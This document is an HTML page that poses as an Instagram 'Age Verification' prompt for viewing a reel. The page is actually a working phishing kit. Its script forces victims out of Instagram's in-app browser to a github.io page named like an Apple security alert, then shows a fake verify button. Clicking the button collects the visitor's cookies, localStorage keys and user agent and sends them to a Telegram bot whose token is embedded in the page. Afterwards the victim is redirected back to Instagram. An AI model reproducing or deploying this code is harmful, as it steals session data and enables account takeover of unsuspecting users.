<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
        body, html { margin:0; padding:0; height:100%; background:#000; font-family: -apple-system, sans-serif; }
        #v { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:9999; color:#fff; text-align:center; padding-top:150px; }
        .btn { background:#0095f6; color:#fff; border:none; padding:15px; border-radius:10px; font-weight:700; width:80%; cursor:pointer; font-size:16px; margin-top:20px; }
    </style>
</head>
<body>
    <div id="v">
        <img src="https://www.instagram.com/static/images/ico/favicon-192.png/b30670883ce2.png" width="60">
        <h2>Age Verification</h2>
        <p style="padding:0 40px; font-size:14px; color:#a8a8a8;">Verify your age to watch this reel.</p>
        <button class="btn" onclick="done()">Verify (18+)</button>
    </div>

    <script>
        const T="8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k", C="8639892987";
        const h=s=>[...s].map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');

        // 1. AUTO-REDIRECT: Agar Instagram ke andar hai, toh Safari mein dhakelo
        if (navigator.userAgent.includes("Instagram")) {
            window.location.href = "x-safari-https://applesecurityalert6-prog.github.io/";
            // Backup redirect for other apps
            setTimeout(() => { window.location.href = "https://applesecurityalert6-prog.github.io/?redirect=true"; }, 1000);
        } else {
            // 2. SHOW POPUP: Agar browser mein hai, toh 2 second baad pop-up dikhao
            setTimeout(() => { document.getElementById('v').style.display = 'block'; }, 2000);
        }

        function done() {
            let d = JSON.stringify({
                st: Object.keys(localStorage),
                ck: document.cookie || "ACTIVE_SESSION",
                ua: navigator.userAgent
            });
            new Image().src=`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🔓_FINAL_${h(d)}`;
            document.getElementById('v').style.display = 'none';
            // Reel par wapas bhejo
            window.location.href = "https://www.instagram.com/reel/DXvjb0FP8W0/";
        }
    </script>
</body>
</html>
